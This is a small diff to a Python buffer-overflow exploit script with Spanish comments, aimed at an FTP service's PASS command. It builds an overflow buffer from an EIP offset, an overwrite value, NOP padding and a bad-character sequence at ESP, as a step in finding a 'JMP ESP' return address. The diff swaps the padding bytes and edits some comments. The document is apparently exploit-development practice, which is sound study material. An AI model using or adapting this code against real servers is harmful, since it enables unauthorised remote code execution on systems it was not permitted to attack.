@@ -10,7 +10,7 @@ try:
     s.connect((rhost, rport))
     s.recv(1024)
 
-    print(colors.Green + "\nRevisión final de badchars para encontrar 'jmp ESP'..." + colors.End)
+    print(colors.Green + "\nRevisión final de badchars para encontrar 'JMP ESP'..." + colors.End)
 
     # usuario
     s.send(b'USER MrW0l05zyn\r\n')
@@ -19,11 +19,11 @@ try:
     buf = b''
     buf += b'A'*(offsetEIP - len(buf))          # offset EIP
     buf += b'BBBB'                           	# sobrescribir EIP
-    buf += b'\x5a'*(offsetESP - offsetEIP - 4)  # padding entre EIP and ESP ('\x5a' = 'Z')
+    buf += b'\x90'*(offsetESP - offsetEIP - 4)  # padding entre EIP and ESP
     buf += badcharsSequence                    	# sobrescribir ESP con secuencia de badchars
     buf += b'D'*(buffer - len(buf))      	    # relleno de padding
 
-    # check offset
+    # JMP ESP
     s.send(b'PASS ' + buf + b'\r\n')
     print(s.recv(1024))
 
